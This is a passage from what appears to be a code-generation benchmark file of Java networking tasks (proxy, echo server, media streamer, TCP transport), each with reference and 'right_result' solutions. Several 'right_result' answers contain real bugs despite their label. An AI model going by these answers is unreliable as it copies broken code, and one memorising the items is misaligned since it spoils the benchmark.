socket;\n        }\n\n        @Override\n        public void run() {\n            processSocket(socket);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.*;\nimport java.util.concurrent.*;\n\npublic class HttpProxyCacheServer {\n    private final Object clientsLock = new Object();\n    private final ExecutorService socketProcessor;\n    private final Map<String, HttpProxyCacheServerClients> clientsMap = new ConcurrentHashMap<>();\n    private ServerSocket serverSocket;\n    private int port;\n    private Thread waitConnectionThread;\n    private Config config;\n\n    public HttpProxyCacheServer(Context context) {\n        this(new Config());\n    }\n\n    public HttpProxyCacheServer(Config config) {\n        this.config = config;\n        socketProcessor = Executors.newFixedThreadPool(config.getMaxThreads());\n        port = config.getPort();\n        startServer();\n    }\n\n    private void startServer() {\n        try {\n            serverSocket = new ServerSocket(port);\n            waitConnectionThread = new Thread(new WaitRequestsRunnable());\n            waitConnectionThread.start();\n        } catch (IOException e) {\n            onError(e);\n        }\n    }\n\n    private void waitForRequest() {\n        while (!Thread.currentThread().isInterrupted()) {\n            try (Socket socket = serverSocket.accept()) {\n                processSocket(socket);\n            } catch (IOException e) {\n                onError(e);\n            }\n        }\n    }\n\n    private void processSocket(Socket socket) {\n        socketProcessor.submit(new SocketProcessorRunnable(socket));\n    }\n\n    private HttpProxyCacheServerClients getClients(String url) {\n        return clientsMap.computeIfAbsent(url, k -> new HttpProxyCacheServerClients(this, k));\n    }\n\n    private void releaseSocket(Socket socket) {\n        closeSocket(socket);\n    }\n\n    private void closeSocketInput(Socket socket) {\n        try {\n            if (socket != null && !socket.isClosed()) {\n                socket.getInputStream().close();\n            }\n        } catch (IOException e) {\n            onError(e);\n        }\n    }\n\n    private void closeSocketOutput(Socket socket) {\n        try {\n            if (socket != null && !socket.isClosed()) {\n                socket.getOutputStream().close();\n            }\n        } catch (IOException e) {\n            onError(e);\n        }\n    }\n\n    private void closeSocket(Socket socket) {\n        try {\n            if (socket != null && !socket.isClosed()) {\n                socket.close();\n            }\n        } catch (IOException e) {\n            onError(e);\n        }\n    }\n\n    private void onError(Throwable e) {\n        // Handle error logic here\n        e.printStackTrace();\n    }\n\n    private class WaitRequestsRunnable implements Runnable {\n        @Override\n        public void run() {\n            waitForRequest();\n        }\n    }\n\n    private class SocketProcessorRunnable implements Runnable {\n        private final Socket socket;\n\n        public SocketProcessorRunnable(Socket socket) {\n            this.socket = socket;\n        }\n\n        @Override\n        public void run() {\n            try {\n                // Process socket logic here\n            } finally {\n                releaseSocket(socket);\n            }\n        }\n    }\n\n    public static class Config {\n        private int maxThreads = 100;\n        private int port = 8080;\n\n        public int getMaxThreads() {\n            return maxThreads;\n        }\n\n        public void setMaxThreads(int maxThreads) {\n            this.maxThreads = maxThreads;\n        }\n\n        public int getPort() {\n            return port;\n        }\n\n        public void setPort(int port) {\n            this.port = port;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 523,
    "Instruction": "Task Description: Implement a TCP transport class that can function as either a server or client, handling network communication with configurable buffer sizes and TCP_NODELAY option.\n\nClass Description: TcpTransport is a class that provides TCP-based communication capabilities, acting as either a server (accepting connections) or client (initiating connections). It manages socket creation, stream handling, and includes a dedicated receiver thread for asynchronous data reception.\n\nAttributes:\n- srv_sock: [ServerSocket] - Server socket instance for accepting connections (server mode)\n- sock: [Socket] - Socket instance for communication (both modes)\n- output: [OutputStream] - Output stream for sending data\n- input: [InputStream] - Input stream for receiving data\n- receiver_thread: [Receiver] - Thread for handling incoming data\n- receiver: [RtReceiver] - Callback handler for received data\n- host: [InetAddress] - Host address for connection\n- port: [int] - Port number for communication (default: 7800)\n- out_buf_size: [int] - Output buffer size (default: 8192)\n- in_buf_size: [int] - Input buffer size (default: 8192)\n- server: [boolean] - Flag indicating server mode\n- tcp_nodelay: [boolean] - TCP_NODELAY socket option flag\n- log: [Log] - Logger instance\n\nMethods:\n- start: [void](String... options) -> [void] - Initializes the transport in either server or client mode, creates sockets and streams, starts receiver thread\n- stop: [void]() -> [void] - Closes all resources (sockets and streams)\n- send: [void](byte[] buf, int offset, int length) -> [void] - Sends data through the output stream\n- Receiver (inner class): [void](InputStream in) -> [void] - Thread class that continuously reads incoming data and notifies receiver callback",
    "Canonical_solution": "import org.jgroups.logging.Log;\nimport org.jgroups.logging.LogFactory;\nimport org.jgroups.tests.RoundTrip;\nimport org.jgroups.tests.rt.RtReceiver;\nimport org.jgroups.util.Util;\n\nimport java.io.*;\nimport java.net.InetAddress;\nimport java.net.InetSocketAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class TcpTransport {\n    protected ServerSocket srv_sock;\n    protected Socket sock;\n    protected OutputStream output;\n    protected InputStream input;\n    protected Receiver receiver_thread;\n    protected RtReceiver receiver;\n    protected InetAddress host;\n    protected int port=7800;\n    protected int out_buf_size=8192, in_buf_size=8192;\n    protected boolean server, tcp_nodelay;\n    protected final Log log=LogFactory.getLog(TcpTransport.class);\n\n    public void start(String ... options) throws Exception {\n        if(server) {\n            srv_sock=new ServerSocket(port, 50, host);\n            Socket s=srv_sock.accept();\n            s.setTcpNoDelay(tcp_nodelay);\n            input=in_buf_size > 0? new BufferedInputStream(s.getInputStream(), in_buf_size) : s.getInputStream();\n            output=out_buf_size > 0? new BufferedOutputStream(s.getOutputStream(), out_buf_size) : s.getOutputStream();\n            receiver_thread=new Receiver(input);\n            receiver_thread.start();\n        }\n        else {\n            sock=new Socket();\n            sock.setTcpNoDelay(tcp_nodelay);\n            sock.connect(new InetSocketAddress(host, port));\n            input=in_buf_size > 0? new BufferedInputStream(sock.getInputStream(), in_buf_size) : sock.getInputStream();\n            output=out_buf_size > 0? new BufferedOutputStream(sock.getOutputStream(), out_buf_size) : sock.getOutputStream();\n            receiver_thread=new Receiver(input);\n            receiver_thread.start();\n        }\n    }\n\n    public void stop() {\n        Util.close(sock, srv_sock, input, output);\n    }\n\n    public void send(byte[] buf, int offset, int length) throws Exception {\n        output.write(buf, offset, length);\n        output.flush();\n    }\n\n    protected class Receiver extends Thread {\n        protected final InputStream in;\n\n        public Receiver(InputStream in) {\n            this.in=in;\n        }\n\n        public void run() {\n            byte[] buf=new byte[RoundTrip.PAYLOAD];\n            for(;;) {\n                try {\n                    int num=in.read(buf, 0, buf.length);\n                    if(num == -1)\n                        return;\n                    if(num != buf.length)\n                        throw new IllegalStateException(\"expected \" + buf.length + \" bytes, but got only \" + num);\n                    if(receiver != null)\n                        receiver.receive(null, buf, 0, buf.length);\n                }\n                catch(Exception e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.concurrent.*;\n\npublic class TcpTransport {\n    private ServerSocket srv_sock;\n    private Socket sock;\n    private OutputStream output;\n    private InputStream input;\n    private Thread receiver_thread;\n    private RtReceiver receiver;\n    private InetAddress host;\n    private int port = 7800;\n    private int out_buf_size = 8192;\n    private int in_buf_size = 8192;\n    private boolean server = false;\n    private boolean tcp_nodelay = true;\n    private Log log;\n\n    public void start(String... options) throws IOException {\n        if (options.length > 0 && options[0].equals(\"server\")) {\n            server = true;\n            srv_sock = new ServerSocket(port);\n            sock = srv_sock.accept();\n        } else {\n            host = InetAddress.getByName(options[0]);\n            sock = new Socket(host, port);\n        }\n        sock.setTcpNoDelay(tcp_nodelay);\n        output = sock.getOutputStream();\n        input = sock.getInputStream();\n        receiver_thread = new Thread(new Receiver(input));\n        receiver_thread.start();\n    }\n\n    public void stop() {\n        try {\n            if (receiver_thread != null) receiver_thread.interrupt();\n            if (output != null) output.close();\n            if (input != null) input.close();\n            if (sock != null) sock.close();\n            if (srv_sock != null) srv_sock.close();\n        } catch (IOException e) {\n            log.error(\"Error closing resources\", e);\n        }\n    }\n\n    public void send(byte[] buf, int offset, int length) throws IOException {\n        output.write(buf, offset, length);\n    }\n\n    private class Receiver implements Runnable {\n        private InputStream in;\n\n        public Receiver(InputStream in) {\n            this.in = in;\n        }\n\n        @Override\n        public void run() {\n            byte[] buffer = new byte[in_buf_size];\n            while (!Thread.currentThread().isInterrupted()) {\n                try {\n                    int bytesRead = in.read(buffer);\n                    if (bytesRead == -1) break;\n                    receiver.onReceive(Arrays.copyOfRange(buffer, 0, bytesRead));\n                } catch (IOException e) {\n                    log.error(\"Error reading from socket\", e);\n                    break;\n                }\n            }\n        }\n    }\n\n    public interface RtReceiver {\n        void onReceive(byte[] data);\n    }\n}\n```"
  },
  {
    "Task_id": 524,
    "Instruction": "Task Description: Create a Java class that implements an HTTP media streaming server capable of serving files over a local network connection using TCP sockets.\n\nClass Description: The HttpMediaStreamer class provides functionality to stream media files over HTTP protocol. It creates a local server socket, handles incoming client connections, and streams the requested file with proper HTTP headers. The class manages the server lifecycle and provides access to the streaming URI.\n\nAttributes:\n- uri: Uri - The URI pointing to the local HTTP streaming endpoint\n- serverSocket: ServerSocket - The server socket instance used for listening to client connections\n- TAG: String - Constant for logging purposes (class name)\n\nMethods:\n- HttpMediaStreamer(String filename, String mimeType) -> [Constructor] - Initializes the streamer with the file to serve and its MIME type\n- getUri() -> Uri - Returns the streaming URI for the hosted file\n- destroy() -> void - Closes the server socket and cleans up resources\n- create(String filename, String mimeType) -> Uri - Internal method that sets up the server socket and starts the streaming thread",
    "Canonical_solution": "import info.guardianproject.iocipher.File;\nimport info.guardianproject.iocipher.FileInputStream;\nimport java.io.BufferedOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport android.net.Uri;\nimport android.util.Log;\n\npublic class HttpMediaStreamer {\n    private static final String TAG = HttpMediaStreamer.class.getSimpleName();\n    private Uri uri;\n    private ServerSocket serverSocket;\n\n    public HttpMediaStreamer(String filename, String mimeType) throws IOException {\n        uri = create(filename, mimeType);\n    }\n\n    public Uri getUri() {\n        return uri;\n    }\n\n    public void destroy() {\n        try {\n            if (serverSocket != null)\n                serverSocket.close();\n        } catch (Exception e) {\n        }\n    }\n\n    private Uri create(final String filename, final String mimeType) throws IOException {\n        final File file = new File(filename);\n        if (!file.exists()) {\n            throw new IOException(\"File not found \" + filename);\n        }\n\n        try {\n            if (serverSocket != null)\n                serverSocket.close();\n        } catch (Exception e) {\n        }\n\n        serverSocket = new ServerSocket(0);\n        new Thread() {\n            public void run() {\n                try {\n                    while (true) {\n                        Socket socket = serverSocket.accept();\n                        byte[] b = new byte[8192];\n                        int len;\n\n                        InputStream is = socket.getInputStream();\n                        StringBuilder isb = new StringBuilder();\n                        len = is.read(b);\n                        isb.append(new String(b));\n\n                        StringBuilder sb = new StringBuilder();\n                        sb.append(\"HTTP/1.1 200\\r\\n\");\n                        sb.append(\"Content-Type: \" + mimeType + \"\\r\\n\");\n                        sb.append(\"Content-Length: \" + file.length() + \"\\r\\n\\r\\n\");\n\n                        BufferedOutputStream bos = new BufferedOutputStream(socket.getOutputStream());\n                        bos.write(sb.toString().getBytes());\n\n                        FileInputStream fis = new FileInputStream(file);\n                        int idx = 0;\n\n                        while ((len = fis.read(b)) != -1) {\n                            bos.write(b, 0, len);\n                            idx += len;\n                            Log.d(TAG, \"sharing via stream: \" + idx);\n                        }\n\n                        fis.close();\n                        bos.flush();\n                        bos.close();\n                        socket.close();\n                    }\n                } catch (IOException e) {\n                    Log.d(TAG, \"web share error\", e);\n                }\n            }\n        }.start();\n\n        Uri uri = Uri.parse(\"http://localhost:\" + serverSocket.getLocalPort() + file.getAbsolutePath());\n        return uri;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\n\npublic class HttpMediaStreamer {\n    private static final String TAG = \"HttpMediaStreamer\";\n    private Uri uri;\n    private ServerSocket serverSocket;\n\n    public HttpMediaStreamer(String filename, String mimeType) {\n        try {\n            serverSocket = new ServerSocket(0);\n            this.uri = new Uri(\"http://localhost:\" + serverSocket.getLocalPort());\n            new Thread(() -> create(filename, mimeType)).start();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public Uri getUri() {\n        return uri;\n    }\n\n    public void destroy() {\n        if (serverSocket != null && !serverSocket.isClosed()) {\n            try {\n                serverSocket.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private void create(String filename, String mimeType) {\n        while (!Thread.currentThread().isInterrupted()) {\n            try (Socket clientSocket = serverSocket.accept();\n                 InputStream fileInputStream = new FileInputStream(filename)) {\n\n                PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);\n                BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n\n                String header = \"HTTP/1.1 200 OK\\r\\n\" +\n                        \"Content-Type: \" + mimeType + \"\\r\\n\" +\n                        \"Connection: close\\r\\n\" +\n                        \"Content-Length: \" + new File(filename).length() + \"\\r\\n\\r\\n\";\n\n                out.println(header);\n\n                byte[] buffer = new byte[4096];\n                int bytesRead;\n                while ((bytesRead = fileInputStream.read(buffer)) != -1) {\n                    out.write(buffer, 0, bytesRead);\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n                break;\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 525,
    "Instruction": "Task Description: Create a Java class that implements a multithreaded TCP echo server capable of handling both plain and SSL/TLS encrypted connections. The server should echo back any data received from clients and support SSL renegotiation.\n\nClass Description: EchoServer is a Thread subclass that creates a TCP server listening on a specified port. It can operate in both plain and SSL/TLS modes, maintains connections in threads, and provides methods for graceful shutdown and connection management.\n\nAttributes:\n- port: int - The port number the server listens on\n- serverSocket: ServerSocket - The server socket accepting client connections\n- threads: List<Thread> - Synchronized list of active client handler threads\n- sockets: List<Socket> - Synchronized list of active client sockets\n- exceptions: List<Exception> - Synchronized list of encountered exceptions\n- renegotiate: AtomicBoolean - Flag to trigger SSL renegotiation\n\nMethods:\n- EchoServer(int port) -> void - Constructor for plain TCP server\n- EchoServer(SSLFactory sslFactory, int port) -> void - Constructor for SSL/TLS server\n- renegotiate() -> void - Triggers SSL renegotiation for all connections\n- run() -> void - Main server thread accepting connections and spawning handlers\n- closeConnections() -> void - Closes all active client connections\n- close() -> void - Shuts down the server gracefully\n- getExceptionCount() -> int - Returns count of encountered exceptions",
    "Canonical_solution": "import com.github.ambry.commons.SSLFactory;\nimport java.io.DataInputStream;\nimport java.io.DataOutputStream;\nimport java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.ArrayList;\nimport java.util.Collections;\nimport java.util.List;\nimport java.util.concurrent.atomic.AtomicBoolean;\nimport javax.net.ssl.SSLContext;\nimport javax.net.ssl.SSLServerSocket;\nimport javax.net.ssl.SSLSocket;\n\npublic class EchoServer extends Thread {\n  public final int port;\n  private final ServerSocket serverSocket;\n  private final List<Thread> threads;\n  private final List<Socket> sockets;\n  private final List<Exception> exceptions;\n  private final AtomicBoolean renegotiate = new AtomicBoolean();\n\n  public EchoServer(int port) throws Exception {\n    this(null, port);\n  }\n\n  public EchoServer(SSLFactory sslFactory, int port) throws Exception {\n    this.port = port;\n    if (sslFactory == null) {\n      this.serverSocket = new ServerSocket(port);\n    } else {\n      SSLContext sslContext = sslFactory.getSSLContext();\n      this.serverSocket = sslContext.getServerSocketFactory().createServerSocket(port);\n      ((SSLServerSocket) this.serverSocket).setNeedClientAuth(true);\n    }\n    this.threads = Collections.synchronizedList(new ArrayList<Thread>());\n    this.sockets = Collections.synchronizedList(new ArrayList<Socket>());\n    this.exceptions = Collections.synchronizedList(new ArrayList<Exception>());\n  }\n\n  public void renegotiate() {\n    renegotiate.set(true);\n  }\n\n  @Override\n  public void run() {\n    try {\n      while (true) {\n        final Socket socket = serverSocket.accept();\n        sockets.add(socket);\n        Thread thread = new Thread() {\n          @Override\n          public void run() {\n            try {\n              socket.setSoTimeout(3000);\n              DataInputStream input = new DataInputStream(socket.getInputStream());\n              DataOutputStream output = new DataOutputStream(socket.getOutputStream());\n              while (socket.isConnected() && !socket.isClosed()) {\n                long size = input.readLong();\n                if (renegotiate.compareAndSet(true, false)) {\n                  ((SSLSocket) socket).startHandshake();\n                }\n                byte[] bytes = new byte[(int) size - 8];\n                input.readFully(bytes);\n                output.writeLong(size);\n                output.write(bytes);\n                output.flush();\n              }\n            } catch (IOException e) {\n              // ignore, caused by client closed connection\n            } finally {\n              try {\n                socket.close();\n              } catch (IOException e) {\n                exceptions.add(e);\n              }\n            }\n          }\n        };\n        thread.start();\n        threads.add(thread);\n      }\n    } catch (IOException e) {\n      exceptions.add(e);\n    }\n  }\n\n  public void closeConnections() throws IOException {\n    for (Socket socket : sockets) {\n      socket.close();\n    }\n  }\n\n  public void close() throws IOException, InterruptedException {\n    this.serverSocket.close();\n    closeConnections();\n    for (Thread t : threads) {\n      t.join();\n    }\n    join();\n  }\n\n  public int getExceptionCount() {\n    return exceptions.size();\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport javax.net.ssl.*;\nimport java.io.*;\nimport java.net.*;\nimport java.util.*;\nimport java.util.concurrent.atomic.*;\n\npublic class EchoServer extends Thread {\n    private final int port;\n    private ServerSocket serverSocket;\n    private final List<Thread> threads = Collections.synchronizedList(new ArrayList<>());\n    private final List<Socket> sockets = Collections.synchronizedList(new ArrayList<>());\n    private final List<Exception> exceptions = Collections.synchronizedList(new ArrayList<>());\n    private final AtomicBoolean renegotiate = new AtomicBoolean(false);\n\n    public EchoServer(int port) throws IOException {\n        this.port = port;\n        this.serverSocket = new ServerSocket(port);\n    }\n\n    public EchoServer(SSLFactory sslFactory, int port) throws IOException {\n        this.port = port;\n        SSLEngine engine = sslFactory.createSSLEngine();\n        engine.setUseClientMode(false);\n        SSLSocketFactory sslSocketFactory = sslFactory.getSocketFactory();\n        this.serverSocket = (ServerSocket) sslSocketFactory.createServerSocket(port);\n    }\n\n    public void renegotiate() {\n        renegotiate.set(true);\n    }\n\n    @Override\n    public void run() {\n        while (!isInterrupted()) {\n            try {\n                Socket clientSocket = serverSocket.accept();\n                SocketHandler handler = new SocketHandler(clientSocket, renegotiate);\n                Thread thread = new Thread(handler);\n                threads.add(thread);\n                sockets.add(clientSocket);\n                thread.start();\n            } catch (IOException e) {\n                synchronized (exceptions) {\n                    exceptions.add(e);\n                }\n            }\n        }\n    }\n\n    public void closeConnections() {\n        for (Socket socket : sockets) {\n            try {\n                socket.close();\n            } catch (IOException e) {\n                synchronized (exceptions) {\n                    exceptions.add(e);\n                }\n            }\n        }\n    }\n\n    public void close() {\n        interrupt();\n        closeConnections();\n    }\n\n    public int getExceptionCount() {\n        return exceptions.size();\n    }\n\n    private static class SocketHandler implements Runnable {\n        private final Socket socket;\n        private final AtomicBoolean renegotiate;\n\n        public SocketHandler(Socket socket, AtomicBoolean renegotiate) {\n            this.socket = socket;\n            this.renegotiate = renegotiate;\n        }\n\n        @Override\n        public void run() {\n            try (\n                BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n                PrintWriter writer = new PrintWriter(socket.getOutputStream(), true)\n            ) {\n                String inputLine;\n                while ((inputLine = reader.readLine()) != null) {\n                    if (renegotiate.get()) {\n                        SSLEngine engine = ((SSLSocket) socket).getSSLEngine();\n                        engine.beginHandshake();\n                        while (!engine.isInboundDone() || !engine.isOutboundDone()) {\n                            // Handle handshake\n                        }\n                        renegotiate.set(false);\n                    }\n                    writer.println(inputLine);\n                }\n            } catch (IOException e) {\n                // Handle exception\n            } finally {\n                try {\n                    socket.close();\n                } catch (IOException e) {\n                    // Handle exception\n                }\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 526,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using ServerSocket to accept client connections and read data from them.\n\nClass Description: The GraphiteBridge class provides functionality to start a TCP server, accept client connections, read data from connected clients, and properly close all connections and resources.\n\nAttributes:\n- serverSocket: ServerSocket - The server socket that listens for incoming client connections\n- clientSocket: Socket - The socket representing an accepted client connection\n- inputReader: BufferedReader - The reader used to read data from the client connection\n\nMethods:\n- startServer(int port) -> void - Starts the server socket listening on the specified port\n- acceptConnection() -> void - Accepts an incoming client connection and initializes the input reader\n- readData() -> String - Reads a line of data from the connected client\n- closeConnection() -> void - Closes all open resources including the input reader, client socket, and server socket",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class GraphiteBridge {\n\n    private ServerSocket serverSocket;\n    private Socket clientSocket;\n    private BufferedReader inputReader;\n\n    public void startServer(int port) throws IOException {\n        serverSocket = new ServerSocket(port);\n    }\n\n    public void acceptConnection() throws IOException {\n        clientSocket = serverSocket.accept();\n        inputReader = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n    }\n\n    public String readData() throws IOException {\n        return inputReader.readLine();\n    }\n\n    public void closeConnection() throws IOException {\n        if (inputReader != null) {\n            inputReader.close();\n        }\n        if (clientSocket != null) {\n            clientSocket.close();\n        }\n        if (serverSocket != null) {\n            serverSocket.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\n\npublic class GraphiteBridge {\n    private ServerSocket serverSocket;\n    private Socket clientSocket;\n    private BufferedReader inputReader;\n\n    public void startServer(int port) throws IOException {\n        serverSocket = new ServerSocket(port);\n        System.out.println(\"Server started on port \" + port);\n    }\n\n    public void acceptConnection() throws IOException {\n        clientSocket = serverSocket.accept();\n        inputReader = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n        System.out.println(\"Client connected\");\n    }\n\n    public String readData() throws IOException {\n        return inputReader.readLine();\n    }\n\n    public void closeConnection() throws IOException {\n        if (inputReader != null) {\n            inputReader.close();\n        }\n        if (clientSocket != null) {\n            clientSocket.close();\n        }\n        if (serverSocket != null) {\n            serverSocket.close();\n        }\n        System.out.println(\"All connections closed\");\n    }\n\n    public static void main(String[] args) {\n        GraphiteBridge bridge = new GraphiteBridge();\n        try {\n            bridge.startServer(12345);\n            bridge.acceptConnection();\n            String data = bridge.readData();\n            System.out.println(\"Received data: \" + data);\n            bridge.closeConnection();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 527,
    "Instruction": "Task Description: Create a TCP proxy server class that handles bidirectional communication between a client and a remote server, with capabilities to start, monitor usage, and shutdown the proxy.\n\nClass Description: JankyProxy is a TCP proxy server implementation that listens on a local port, forwards client requests to a remote server, and relays responses back to the client. It uses multithreading to handle bidirectional communication simultaneously.\n\nAttributes:\n- thread: ThreadProxy - The worker thread handling the proxy operations\n- sClient: Socket - The client socket connection\n- socket: ServerSocket - The server socket listening for client connections\n- SERVER_URL: String - The URL of the remote server to proxy to\n- SERVER_PORT: int - The port of the remote server to proxy to\n- wasUsedForClientToServer: boolean - Flag indicating if the proxy was used for client-to-server communication\n\nMethods:\n- runServer(String host, int remoteport, int localport) -> void - Starts the proxy server listening on the specified local port and forwarding to the given remote host and port\n- wasUsed() -> boolean - Returns whether the proxy was used for client-to-server communication\n- shutdown() -> void - Gracefully shuts down the proxy server\n- run() -> void - (ThreadProxy method) The main proxy logic handling bidirectional communication between client and server\n- shutdown() -> void - (ThreadProxy method) Stops the proxy thread and closes connections",
    "Canonical_solution": "import java.io.*;\nimport java.net.*;\n\npublic class JankyProxy {\n    private static ThreadProxy thread;\n\n    public static void runServer(String host, int remoteport, int localport) {\n        try {\n            System.out.println(\"Starting proxy for \" + host + \":\" + remoteport + \" on port \" + localport);\n            ServerSocket server = new ServerSocket(localport);\n            thread = new ThreadProxy(server, host, remoteport);\n        } catch (Exception e) {\n            System.err.println(e);\n            System.err.println(\"Usage: java ProxyMultiThread <host> <remoteport> <localport>\");\n        }\n    }\n\n    public static boolean wasUsed() {\n        return thread.wasUsedForClientToServer;\n    }\n\n    public static void shutdown() {\n        if (thread != null) {\n            try {\n                thread.shutdown();\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private static class ThreadProxy extends Thread {\n        private Socket sClient;\n        private ServerSocket socket;\n        private final String SERVER_URL;\n        private final int SERVER_PORT;\n        public boolean wasUsedForClientToServer;\n\n        public ThreadProxy(ServerSocket socket, String ServerUrl, int ServerPort) {\n            this.SERVER_URL = ServerUrl;\n            this.SERVER_PORT = ServerPort;\n            this.socket = socket;\n            this.start();\n        }\n\n        @Override\n        public void run() {\n            try {\n                sClient = socket.accept();\n                final byte[] request = new byte[1024];\n                byte[] reply = new byte[4096];\n                final InputStream inFromClient = sClient.getInputStream();\n                final OutputStream outToClient = sClient.getOutputStream();\n                Socket server = null;\n\n                try {\n                    server = new Socket(SERVER_URL, SERVER_PORT);\n                } catch (IOException e) {\n                    PrintWriter out = new PrintWriter(new OutputStreamWriter(outToClient));\n                    out.flush();\n                    System.out.println(\"SERVER_URL = \" + SERVER_URL + \" : \" + SERVER_PORT);\n                    throw new RuntimeException(e);\n                }\n\n                final InputStream inFromServer = server.getInputStream();\n                final OutputStream outToServer = server.getOutputStream();\n\n                new Thread(() -> {\n                    int bytes_read;\n                    try {\n                        while ((bytes_read = inFromClient.read(request)) != -1) {\n                            outToServer.write(request, 0, bytes_read);\n                            outToServer.flush();\n                            wasUsedForClientToServer = true;\n                        }\n                    } catch (IOException ignored) {\n                    }\n                    try {\n                        outToServer.close();\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                    }\n                }).start();\n\n                int bytes_read;\n                try {\n                    while ((bytes_read = inFromServer.read(reply)) != -1) {\n                        outToClient.write(reply, 0, bytes_read);\n                        outToClient.flush();\n                    }\n                } catch (IOException e) {\n                } finally {\n                    try {\n                        if (server != null) server.close();\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                    }\n                }\n                outToClient.close();\n                sClient.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n\n        public void shutdown() {\n            try {\n                socket.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n            interrupt();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\n\npublic class JankyProxy {\n    private ThreadProxy thread;\n    private Socket sClient;\n    private ServerSocket socket;\n    private String SERVER_URL;\n    private int SERVER_PORT;\n    private boolean wasUsedForClientToServer;\n\n    public void runServer(String host, int remoteport, int localport) throws IOException {\n        SERVER_URL = host;\n        SERVER_PORT = remoteport;\n        socket = new ServerSocket(localport);\n        while (true) {\n            sClient = socket.accept();\n            wasUsedForClientToServer = false;\n            thread = new ThreadProxy(sClient);\n            thread.start();\n        }\n    }\n\n    public boolean wasUsed() {\n        return wasUsedForClientToServer;\n    }\n\n    public void shutdown() {\n        try {\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private class ThreadProxy extends Thread {\n        private Socket sClient;\n\n        public ThreadProxy(Socket sClient) {\n            this.sClient = sClient;\n        }\n\n        @Override\n        public void run() {\n            Socket sServer = null;\n            try {\n                sServer = new Socket(SERVER_URL, SERVER_PORT);\n                InputStream isClient = sClient.getInputStream();\n                OutputStream osClient = sClient.getOutputStream();\n                InputStream isServer = sServer.getInputStream();\n                OutputStream osServer = sServer.getOutputStream();\n\n                Thread readFromClient = new Thread(() -> {\n                    try {\n                        byte[] buffer = new byte[1024];\n                        int bytesRead;\n                        while ((bytesRead = isClient.read(buffer)) != -1) {\n                            osServer.write(buffer, 0, bytesRead);\n                            osServer.flush();\n                            wasUsedForClientToServer = true;\n                        }\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                    }\n                });\n\n                Thread writeToClient = new Thread(() -> {\n                    try {\n                        byte[] buffer = new byte[1024];\n                        int bytesRead;\n                        while ((bytesRead = isServer.read(buffer)) != -1) {\n                            osClient.write(buffer, 0, bytesRead);\n                            osClient.flush();\n                        }\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                    }\n                });\n\n                readFromClient.start();\n                writeToClient.start();\n                readFromClient.join();\n                writeToClient.join();\n            } catch (IOException | InterruptedException e) {\n                e.printStackTrace();\n            } finally {\n                try {\n                    if (sClient != null) sClient.close();\n                    if (sServer != null) sServer.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n\n        public void shutdown() {\n            try {\n                if (sClient != null) sClient.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 528,
    "Instruction": "Task Description: Implement a Java class that creates a TCP server using ServerSocket with GSSAPI (Generic Security Services API) authentication for secure client-server communication.\n\nClass Description: The GSSServer class establishes a secure TCP server that listens for incoming client connections, performs GSSAPI authentication, and enables secure message exchange between server and client.\n\nAttributes:\n- s: [ServerSocket] - The server socket that listens for incoming client connections on a specified port.\n\nMethods:\n- main([String[] args]) -> [void] - Entry point of the server application. Parses command line arguments (service name, port, and mechanism OID), creates server credentials, and starts listening for client connections.\n  Input: Command line arguments (optional: -port [portNumber], -mech [mechanismOID], serviceName)\n  Output: None (runs indefinitely until terminated)\n\n- processClient([GSSCredential server], [Socket client]) -> [void] - Handles an individual client connection by performing GSSAPI authentication and establishing a secure context.\n  Input: \n    - server: [GSSCredential] - Server's credentials for authentication\n    - client: [Socket] - Client connection socket\n  Output: None (closes connection when done)\n\n- exchangeWithPeer([GSSContext aCtxt], [DataInputStream dis], [DataOutputStream dos]) -> [void] - Performs secure message exchange with an authenticated client.\n  Input:\n    - aCtxt: [GSSContext] - Established security context\n    - dis: [DataInputStream] - Input stream from client\n    - dos: [DataOutputStream] - Output stream to client\n  Output: None (sends response and closes connection)\n\n- usage() -> [void] - Prints usage instructions for the 